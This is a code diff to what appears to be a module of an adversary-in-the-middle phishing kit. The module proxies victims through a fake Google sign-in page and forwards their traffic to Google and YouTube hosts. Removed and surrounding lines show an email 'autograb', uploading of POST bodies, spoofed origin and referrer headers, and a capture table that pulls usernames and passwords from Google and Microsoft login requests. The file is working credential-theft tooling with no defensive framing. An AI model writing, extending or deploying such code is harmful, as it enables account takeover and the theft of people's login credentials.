@@ -169,32 +169,23 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
     execute(clientContext) {
-
-        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
-
-        
-        // this.req.headers['user-agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1'
-        if (this.req.method === 'POST') {
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
-        }
        
         if (this.req.url.startsWith('/punctual/')) {
             
-            this.req.headers['referrer'] = 'https://accounts.google.com'
-            if (this.req.headers['origin']) {
-                this.req.headers['origin'] = 'https://accounts.google.com'
-            }
             return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
         }
+
         if (this.req.url === '/cold204') {
             this.res.writeHead(204)
             return this.res.end('')
         }
+
         if (this.req.url.startsWith('/playboy')) {
             const qhost = 'play.google.com'
             this.req.url = this.req.url.replace('/playboy/log', '/log')
             return super.superExecuteProxy(qhost, clientContext)
         }
+
         if (this.req.url.startsWith('/CheckConnection')) {
             this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
             return super.superExecuteProxy('accounts.youtube.com', clientContext)
@@ -226,13 +217,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             }
         }
 
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
+        // if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
+        //     clientContext.currentDomain = process.env.PROXY_DOMAIN
+        //     this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+        //     // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
+        // }
 
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+        return super.execute(clientContext)
 
     }
 }
@@ -241,11 +232,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
+    SCHEME: 'gmail',
+
     CURRENT_DOMAIN: 'accounts.google.com',
 
     START_PATH: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
 
     AUTOGRAB_CODE: 'Email',
+
+
 
     EXTERNAL_FILTERS: 
     [
@@ -263,37 +258,14 @@ const configExport = {
 
 
 
-    CAPTURES: {
-        loginUserName: {
-            method: 'POST',
-            params: ['username'],
-            urls: '',
-            hosts: ['login.microsoftonline.com'],
-        },
+    CAPTURES: { },
 
-        loginPassword: {
-            method: 'POST',
-            params: ['f.req'],
-            urls: '',
-            hosts: ['accounts.google.net'],
-        },
+    //MODULE OPTIONS 
+    MODULE_ENABLED: true,
 
-
-        loginFmt: {
-            method: 'POST',
-            params: ['loginfmt'],
-            urls: '',
-            hosts: ['login.microsoftonline.com'],
-        },
-
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
-
-        cookieKEY: 'loginUsername'
+    MODULE_OPTIONS: {
+        startPath: this.START_PATH,
+        exitLink: '',
     },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
